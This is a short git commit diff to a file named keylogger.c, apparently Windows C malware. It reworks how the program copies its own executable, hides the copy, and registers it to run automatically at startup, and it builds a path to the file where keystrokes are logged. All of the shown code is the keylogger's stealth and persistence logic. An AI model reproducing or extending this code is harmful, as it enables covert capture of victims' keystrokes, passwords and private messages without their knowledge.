54a35da0d6be77c5895c35c8fb4fb09576ce9ce4
ErilinAleksei <43059387+ErilinAleksei@users.noreply.github.com>
2021-03-26 14:48:00 +0300

    Update keylogger.c

--- keylogger/keylogger.c
+++ keylogger/keylogger.c
@@ -20,11 +20,10 @@ int main(int argc, char **argv){
     if((nameProg = basename(currPath)) != NULL){
         strcat(newPath, "\\");
         strcat(newPath, nameProg);
-        if(strcmp(currPath, newPath)!= 0){
+        if(strcmp(currPath, newPath)!= 0)
             CopyFile(currPath, newPath, FALSE);
-            setHidden(newPath);
-            setAutoRun(newPath, nameProg);
-        }
+        setHidden(newPath);
+        setAutoRun(newPath, nameProg);
         path = dirname(newPath);
         strcat(path, "\\");
         strcat(path, KEY_FILE);
